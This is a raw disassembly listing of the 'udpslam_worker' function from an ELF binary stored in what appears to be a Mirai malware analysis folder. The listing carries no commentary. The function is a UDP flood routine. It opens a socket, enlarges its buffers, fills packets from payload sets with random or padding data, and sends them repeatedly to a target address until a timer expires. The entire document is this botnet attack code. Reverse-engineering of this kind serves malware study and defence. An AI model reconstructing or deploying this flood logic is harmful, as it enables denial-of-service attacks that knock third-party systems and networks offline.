
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

0000000000402100 <udpslam_worker>:
  402100: 41 57                        	push	r15
  402102: 41 56                        	push	r14
  402104: 41 55                        	push	r13
  402106: 41 54                        	push	r12
  402108: 55                           	push	rbp
  402109: 53                           	push	rbx
  40210a: 48 81 ec 38 01 00 00         	sub	rsp, 0x138
  402111: 48 89 3c 24                  	mov	qword ptr [rsp], rdi
  402115: 31 ff                        	xor	edi, edi
  402117: e8 b4 57 00 00               	call	0x4078d0 <time>
  40211c: 48 8b 0c 24                  	mov	rcx, qword ptr [rsp]
  402120: be 02 00 00 00               	mov	esi, 0x2
  402125: bf 02 00 00 00               	mov	edi, 0x2
  40212a: 48 63 51 44                  	movsxd	rdx, dword ptr [rcx + 0x44]
  40212e: 48 01 d0                     	add	rax, rdx
  402131: 31 d2                        	xor	edx, edx
  402133: 48 89 44 24 08               	mov	qword ptr [rsp + 0x8], rax
  402138: e8 37 87 00 00               	call	0x40a874 <socket>
  40213d: 85 c0                        	test	eax, eax
  40213f: 89 44 24 14                  	mov	dword ptr [rsp + 0x14], eax
  402143: 0f 88 d0 01 00 00            	js	0x402319 <udpslam_worker+0x219>
  402149: 48 8d 9c 24 2c 01 00 00      	lea	rbx, [rsp + 0x12c]
  402151: 8b 7c 24 14                  	mov	edi, dword ptr [rsp + 0x14]
  402155: 41 b8 04 00 00 00            	mov	r8d, 0x4
  40215b: ba 07 00 00 00               	mov	edx, 0x7
  402160: be 01 00 00 00               	mov	esi, 0x1
  402165: c7 84 24 2c 01 00 00 00 00 80 00     	mov	dword ptr [rsp + 0x12c], 0x800000
  402170: 48 89 d9                     	mov	rcx, rbx
  402173: e8 c4 86 00 00               	call	0x40a83c <setsockopt>
  402178: 8b 7c 24 14                  	mov	edi, dword ptr [rsp + 0x14]
  40217c: 41 b8 04 00 00 00            	mov	r8d, 0x4
  402182: 48 89 d9                     	mov	rcx, rbx
  402185: ba 08 00 00 00               	mov	edx, 0x8
  40218a: be 01 00 00 00               	mov	esi, 0x1
  40218f: e8 a8 86 00 00               	call	0x40a83c <setsockopt>
  402194: 48 8b 14 24                  	mov	rdx, qword ptr [rsp]
  402198: 48 c7 84 24 10 01 00 00 00 00 00 00  	mov	qword ptr [rsp + 0x110], 0x0
  4021a4: bf 02 00 00 00               	mov	edi, 0x2
  4021a9: 48 c7 84 24 18 01 00 00 00 00 00 00  	mov	qword ptr [rsp + 0x118], 0x0
  4021b5: 48 8b 34 24                  	mov	rsi, qword ptr [rsp]
  4021b9: 66 c7 84 24 10 01 00 00 02 00	mov	word ptr [rsp + 0x110], 0x2
  4021c3: 8b 42 40                     	mov	eax, dword ptr [rdx + 0x40]
  4021c6: 48 8d 94 24 10 01 00 00      	lea	rdx, [rsp + 0x110]
  4021ce: 66 c1 c8 08                  	ror	ax, 0x8
  4021d2: 48 83 c2 04                  	add	rdx, 0x4
  4021d6: 66 89 84 24 12 01 00 00      	mov	word ptr [rsp + 0x112], ax
  4021de: e8 cc 7f 00 00               	call	0x40a1af <inet_pton>
  4021e3: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  4021e8: ba 05 00 00 00               	mov	edx, 0x5
  4021ed: be 40 77 51 00               	mov	esi, 0x517740
  4021f2: e8 a9 fe ff ff               	call	0x4020a0 <init_payload_set>
  4021f7: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  4021fc: ba 02 00 00 00               	mov	edx, 0x2
  402201: be 70 77 51 00               	mov	esi, 0x517770
  402206: 48 83 c7 18                  	add	rdi, 0x18
  40220a: e8 91 fe ff ff               	call	0x4020a0 <init_payload_set>
  40220f: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  402214: ba 03 00 00 00               	mov	edx, 0x3
  402219: be 80 77 51 00               	mov	esi, 0x517780
  40221e: 48 83 c7 30                  	add	rdi, 0x30
  402222: e8 79 fe ff ff               	call	0x4020a0 <init_payload_set>
  402227: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  40222c: ba 05 00 00 00               	mov	edx, 0x5
  402231: be a0 77 51 00               	mov	esi, 0x5177a0
  402236: 48 83 c7 48                  	add	rdi, 0x48
  40223a: e8 61 fe ff ff               	call	0x4020a0 <init_payload_set>
  40223f: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  402244: ba 02 00 00 00               	mov	edx, 0x2
  402249: be d0 77 51 00               	mov	esi, 0x5177d0
  40224e: 48 83 c7 60                  	add	rdi, 0x60
  402252: e8 49 fe ff ff               	call	0x4020a0 <init_payload_set>
  402257: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  40225c: ba 03 00 00 00               	mov	edx, 0x3
  402261: be e0 77 51 00               	mov	esi, 0x5177e0
  402266: 48 83 c7 78                  	add	rdi, 0x78
  40226a: e8 31 fe ff ff               	call	0x4020a0 <init_payload_set>
  40226f: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  402274: ba 02 00 00 00               	mov	edx, 0x2
  402279: be 00 78 51 00               	mov	esi, 0x517800
  40227e: 48 81 c7 90 00 00 00         	add	rdi, 0x90
  402285: e8 16 fe ff ff               	call	0x4020a0 <init_payload_set>
  40228a: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  40228f: ba 02 00 00 00               	mov	edx, 0x2
  402294: be 10 78 51 00               	mov	esi, 0x517810
  402299: 48 81 c7 a8 00 00 00         	add	rdi, 0xa8
  4022a0: e8 fb fd ff ff               	call	0x4020a0 <init_payload_set>
  4022a5: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  4022aa: ba 03 00 00 00               	mov	edx, 0x3
  4022af: be 20 78 51 00               	mov	esi, 0x517820
  4022b4: 48 81 c7 c0 00 00 00         	add	rdi, 0xc0
  4022bb: e8 e0 fd ff ff               	call	0x4020a0 <init_payload_set>
  4022c0: 48 8d 7c 24 20               	lea	rdi, [rsp + 0x20]
  4022c5: ba 02 00 00 00               	mov	edx, 0x2
  4022ca: be 40 78 51 00               	mov	esi, 0x517840
  4022cf: 48 81 c7 d8 00 00 00         	add	rdi, 0xd8
  4022d6: e8 c5 fd ff ff               	call	0x4020a0 <init_payload_set>
  4022db: 48 8b 0c 24                  	mov	rcx, qword ptr [rsp]
  4022df: 48 63 79 48                  	movsxd	rdi, dword ptr [rcx + 0x48]
  4022e3: e8 e0 87 00 00               	call	0x40aac8 <malloc>
  4022e8: 48 85 c0                     	test	rax, rax
  4022eb: 49 89 c7                     	mov	r15, rax
  4022ee: 75 3a                        	jne	0x40232a <udpslam_worker+0x22a>
  4022f0: 31 db                        	xor	ebx, ebx
  4022f2: 48 8b 7c 1c 28               	mov	rdi, qword ptr [rsp + rbx + 0x28]
  4022f7: 48 83 c3 18                  	add	rbx, 0x18
  4022fb: e8 5b 93 00 00               	call	0x40b65b <free>
  402300: 48 81 fb f0 00 00 00         	cmp	rbx, 0xf0
  402307: 75 e9                        	jne	0x4022f2 <udpslam_worker+0x1f2>
  402309: 8b 7c 24 14                  	mov	edi, dword ptr [rsp + 0x14]
  40230d: e8 2c 30 00 00               	call	0x40533e <close>
  402312: 31 ff                        	xor	edi, edi
  402314: e8 96 07 00 00               	call	0x402aaf <pthread_exit>
  402319: bf d9 6f 41 00               	mov	edi, 0x416fd9
  40231e: e8 f9 5a 00 00               	call	0x407e1c <perror>
  402323: 31 ff                        	xor	edi, edi
  402325: e8 85 07 00 00               	call	0x402aaf <pthread_exit>
  40232a: e8 7d 98 00 00               	call	0x40bbac <rand>
  40232f: ba 56 55 55 55               	mov	edx, 0x55555556
  402334: 89 c6                        	mov	esi, eax
  402336: 31 ff                        	xor	edi, edi
  402338: f7 ea                        	imul	edx
  40233a: 89 f1                        	mov	ecx, esi
  40233c: 45 31 f6                     	xor	r14d, r14d
  40233f: c1 f9 1f                     	sar	ecx, 0x1f
  402342: 29 ca                        	sub	edx, ecx
  402344: 8d 14 52                     	lea	edx, [rdx + 2*rdx]
  402347: 29 d6                        	sub	esi, edx
  402349: 89 74 24 18                  	mov	dword ptr [rsp + 0x18], esi
  40234d: e8 7e 55 00 00               	call	0x4078d0 <time>
  402352: 48 89 c3                     	mov	rbx, rax
  402355: 89 dd                        	mov	ebp, ebx
  402357: e8 c5 30 00 00               	call	0x405421 <pthread_self>
  40235c: 31 c5                        	xor	ebp, eax
  40235e: 31 ff                        	xor	edi, edi
  402360: e8 6b 55 00 00               	call	0x4078d0 <time>
  402365: 48 39 44 24 08               	cmp	qword ptr [rsp + 0x8], rax
  40236a: 0f 8e 51 02 00 00            	jle	0x4025c1 <udpslam_worker+0x4c1>
  402370: c7 44 24 1c 00 00 00 00      	mov	dword ptr [rsp + 0x1c], 0x0
  402378: eb 7d                        	jmp	0x4023f7 <udpslam_worker+0x2f7>
  40237a: 66 66 90                     	nop
  40237d: 66 66 90                     	nop
  402380: 4c 63 e3                     	movsxd	r12, ebx
  402383: 4c 89 ff                     	mov	rdi, r15
  402386: 4c 89 ee                     	mov	rsi, r13
  402389: 4c 89 e2                     	mov	rdx, r12
  40238c: e8 1f 77 00 00               	call	0x409ab0 <memcpy>
  402391: 48 8b 0c 24                  	mov	rcx, qword ptr [rsp]
  402395: 8b 79 48                     	mov	edi, dword ptr [rcx + 0x48]
  402398: 89 fa                        	mov	edx, edi
  40239a: 29 da                        	sub	edx, ebx
  40239c: 85 d2                        	test	edx, edx
  40239e: 7e 23                        	jle	0x4023c3 <udpslam_worker+0x2c3>
  4023a0: 69 c5 6d 4e c6 41            	imul	eax, ebp, 0x41c64e6d
  4023a6: 8d a8 39 30 00 00            	lea	ebp, [rax + 0x3039]
  4023ac: 89 e8                        	mov	eax, ebp
  4023ae: 83 e0 03                     	and	eax, 0x3
  4023b1: 83 f8 01                     	cmp	eax, 0x1
  4023b4: 0f 84 5b 01 00 00            	je	0x402515 <udpslam_worker+0x415>
  4023ba: 83 f8 02                     	cmp	eax, 0x2
  4023bd: 0f 84 c4 01 00 00            	je	0x402587 <udpslam_worker+0x487>
  4023c3: 48 63 d7                     	movsxd	rdx, edi
  4023c6: 8b 7c 24 14                  	mov	edi, dword ptr [rsp + 0x14]
  4023ca: 4c 8d 84 24 10 01 00 00      	lea	r8, [rsp + 0x110]
  4023d2: 41 b9 10 00 00 00            	mov	r9d, 0x10
  4023d8: b9 40 40 00 00               	mov	ecx, 0x4040
  4023dd: 4c 89 fe                     	mov	rsi, r15
  4023e0: e8 b3 27 00 00               	call	0x404b98 <sendto>
  4023e5: ff 44 24 1c                  	inc	dword ptr [rsp + 0x1c]
  4023e9: 81 7c 24 1c 00 02 00 00      	cmp	dword ptr [rsp + 0x1c], 0x200
  4023f1: 0f 84 67 ff ff ff            	je	0x40235e <udpslam_worker+0x25e>
  4023f7: b8 67 66 66 66               	mov	eax, 0x66666667
  4023fc: f7 6c 24 1c                  	imul	dword ptr [rsp + 0x1c]
  402400: 8b 44 24 1c                  	mov	eax, dword ptr [rsp + 0x1c]
  402404: c1 f8 1f                     	sar	eax, 0x1f
  402407: c1 fa 02                     	sar	edx, 0x2
  40240a: 29 c2                        	sub	edx, eax
  40240c: 8d 04 d5 00 00 00 00         	lea	eax, [8*rdx]
  402413: 8d 14 50                     	lea	edx, [rax + 2*rdx]
  402416: 39 54 24 1c                  	cmp	dword ptr [rsp + 0x1c], edx
  40241a: 75 54                        	jne	0x402470 <udpslam_worker+0x370>
  40241c: 69 c5 6d 4e c6 41            	imul	eax, ebp, 0x41c64e6d
  402422: 83 7c 24 18 01               	cmp	dword ptr [rsp + 0x18], 0x1
  402427: 8d a8 39 30 00 00            	lea	ebp, [rax + 0x3039]
  40242d: 0f 84 bd 00 00 00            	je	0x4024f0 <udpslam_worker+0x3f0>
  402433: 83 7c 24 18 02               	cmp	dword ptr [rsp + 0x18], 0x2
  402438: 0f 84 0f 01 00 00            	je	0x40254d <udpslam_worker+0x44d>
  40243e: 41 8d 4e 01                  	lea	ecx, [r14 + 0x1]
  402442: b8 67 66 66 66               	mov	eax, 0x66666667
  402447: f7 e9                        	imul	ecx
  402449: 89 c8                        	mov	eax, ecx
  40244b: c1 f8 1f                     	sar	eax, 0x1f
  40244e: 41 89 d6                     	mov	r14d, edx
  402451: 41 c1 fe 02                  	sar	r14d, 0x2
  402455: 41 29 c6                     	sub	r14d, eax
  402458: 42 8d 04 f5 00 00 00 00      	lea	eax, [8*r14]
  402460: 42 8d 04 70                  	lea	eax, [rax + 2*r14]
  402464: 41 89 ce                     	mov	r14d, ecx
  402467: 41 29 c6                     	sub	r14d, eax
  40246a: 66 66 90                     	nop
  40246d: 66 66 90                     	nop
  402470: 49 63 c6                     	movsxd	rax, r14d
  402473: 48 8d 4c 24 20               	lea	rcx, [rsp + 0x20]
  402478: 48 8d 14 c5 00 00 00 00      	lea	rdx, [8*rax]
  402480: 48 c1 e0 05                  	shl	rax, 0x5
  402484: 48 29 d0                     	sub	rax, rdx
  402487: 48 01 c1                     	add	rcx, rax
  40248a: 69 c5 6d 4e c6 41            	imul	eax, ebp, 0x41c64e6d
  402490: 31 d2                        	xor	edx, edx
  402492: 31 f6                        	xor	esi, esi
  402494: 4c 89 ff                     	mov	rdi, r15
  402497: 8d a8 39 30 00 00            	lea	ebp, [rax + 0x3039]
  40249d: 89 e8                        	mov	eax, ebp
  40249f: f7 71 10                     	div	dword ptr [rcx + 0x10]
  4024a2: 48 8b 01                     	mov	rax, qword ptr [rcx]
  4024a5: 48 63 d2                     	movsxd	rdx, edx
  4024a8: 4c 8b 2c d0                  	mov	r13, qword ptr [rax + 8*rdx]
  4024ac: 48 8b 41 08                  	mov	rax, qword ptr [rcx + 0x8]
  4024b0: 48 8b 0c 24                  	mov	rcx, qword ptr [rsp]
  4024b4: 8b 1c 90                     	mov	ebx, dword ptr [rax + 4*rdx]
  4024b7: 48 63 51 48                  	movsxd	rdx, dword ptr [rcx + 0x48]
  4024bb: e8 60 76 00 00               	call	0x409b20 <memset>
  4024c0: 48 8b 14 24                  	mov	rdx, qword ptr [rsp]
  4024c4: 8b 42 48                     	mov	eax, dword ptr [rdx + 0x48]
  4024c7: 39 c3                        	cmp	ebx, eax
  4024c9: 0f 8e b1 fe ff ff            	jle	0x402380 <udpslam_worker+0x280>
  4024cf: 48 63 d0                     	movsxd	rdx, eax
  4024d2: 4c 89 ff                     	mov	rdi, r15
  4024d5: 4c 89 ee                     	mov	rsi, r13
  4024d8: e8 d3 75 00 00               	call	0x409ab0 <memcpy>
  4024dd: 48 8b 14 24                  	mov	rdx, qword ptr [rsp]
  4024e1: 8b 7a 48                     	mov	edi, dword ptr [rdx + 0x48]
  4024e4: e9 da fe ff ff               	jmp	0x4023c3 <udpslam_worker+0x2c3>
  4024e9: 66 66 66 90                  	nop
  4024ed: 66 66 90                     	nop
  4024f0: b8 cd cc cc cc               	mov	eax, 0xcccccccd
  4024f5: f7 e5                        	mul	ebp
  4024f7: 41 89 d6                     	mov	r14d, edx
  4024fa: 41 c1 ee 03                  	shr	r14d, 0x3
  4024fe: 42 8d 04 f5 00 00 00 00      	lea	eax, [8*r14]
  402506: 42 8d 04 70                  	lea	eax, [rax + 2*r14]
  40250a: 41 89 ee                     	mov	r14d, ebp
  40250d: 41 29 c6                     	sub	r14d, eax
  402510: e9 5b ff ff ff               	jmp	0x402470 <udpslam_worker+0x370>
  402515: 89 d6                        	mov	esi, edx
  402517: 4b 8d 04 27                  	lea	rax, [r15 + r12]
  40251b: c1 fe 02                     	sar	esi, 0x2
  40251e: 85 f6                        	test	esi, esi
  402520: 0f 8e 9d fe ff ff            	jle	0x4023c3 <udpslam_worker+0x2c3>
  402526: 48 89 c2                     	mov	rdx, rax
  402529: 31 c9                        	xor	ecx, ecx
  40252b: 66 66 90                     	nop
  40252e: 66 90                        	nop
  402530: 69 c5 6d 4e c6 41            	imul	eax, ebp, 0x41c64e6d
  402536: ff c1                        	inc	ecx
  402538: 8d a8 39 30 00 00            	lea	ebp, [rax + 0x3039]
  40253e: 89 2a                        	mov	dword ptr [rdx], ebp
  402540: 48 83 c2 04                  	add	rdx, 0x4
  402544: 39 f1                        	cmp	ecx, esi
  402546: 75 e8                        	jne	0x402530 <udpslam_worker+0x430>
  402548: e9 76 fe ff ff               	jmp	0x4023c3 <udpslam_worker+0x2c3>
  40254d: 89 e8                        	mov	eax, ebp
  40254f: ba 1f 85 eb 51               	mov	edx, 0x51eb851f
  402554: b9 64 00 00 00               	mov	ecx, 0x64
  402559: f7 e2                        	mul	edx
  40255b: 89 e8                        	mov	eax, ebp
  40255d: 45 31 f6                     	xor	r14d, r14d
  402560: c1 ea 05                     	shr	edx, 0x5
  402563: 0f af d1                     	imul	edx, ecx
  402566: 48 8d 4c 24 20               	lea	rcx, [rsp + 0x20]
  40256b: 29 d0                        	sub	eax, edx
  40256d: 83 f8 1d                     	cmp	eax, 0x1d
  402570: 0f 8e 14 ff ff ff            	jle	0x40248a <udpslam_worker+0x38a>
  402576: 83 f8 31                     	cmp	eax, 0x31
  402579: 7f 29                        	jg	0x4025a4 <udpslam_worker+0x4a4>
  40257b: 48 83 c1 30                  	add	rcx, 0x30
  40257f: 41 b6 02                     	mov	r14b, 0x2
  402582: e9 03 ff ff ff               	jmp	0x40248a <udpslam_worker+0x38a>
  402587: 4b 8d 3c 27                  	lea	rdi, [r15 + r12]
  40258b: 48 63 d2                     	movsxd	rdx, edx
  40258e: be 41 00 00 00               	mov	esi, 0x41
  402593: e8 88 75 00 00               	call	0x409b20 <memset>
  402598: 48 8b 04 24                  	mov	rax, qword ptr [rsp]
  40259c: 8b 78 48                     	mov	edi, dword ptr [rax + 0x48]
  40259f: e9 1f fe ff ff               	jmp	0x4023c3 <udpslam_worker+0x2c3>
  4025a4: 83 f8 40                     	cmp	eax, 0x40
  4025a7: 0f 8f 43 ff ff ff            	jg	0x4024f0 <udpslam_worker+0x3f0>
  4025ad: 48 8d 4c 24 20               	lea	rcx, [rsp + 0x20]
  4025b2: 41 be 03 00 00 00            	mov	r14d, 0x3
  4025b8: 48 83 c1 48                  	add	rcx, 0x48
  4025bc: e9 c9 fe ff ff               	jmp	0x40248a <udpslam_worker+0x38a>
  4025c1: 31 db                        	xor	ebx, ebx
  4025c3: 48 8b 7c 1c 28               	mov	rdi, qword ptr [rsp + rbx + 0x28]
  4025c8: 48 83 c3 18                  	add	rbx, 0x18
  4025cc: e8 8a 90 00 00               	call	0x40b65b <free>
  4025d1: 48 81 fb f0 00 00 00         	cmp	rbx, 0xf0
  4025d8: 75 e9                        	jne	0x4025c3 <udpslam_worker+0x4c3>
  4025da: 4c 89 ff                     	mov	rdi, r15
  4025dd: e8 79 90 00 00               	call	0x40b65b <free>
  4025e2: e9 22 fd ff ff               	jmp	0x402309 <udpslam_worker+0x209>
  4025e7: 66 66 90                     	nop
  4025ea: 66 66 90                     	nop
  4025ed: 66 66 90                     	nop
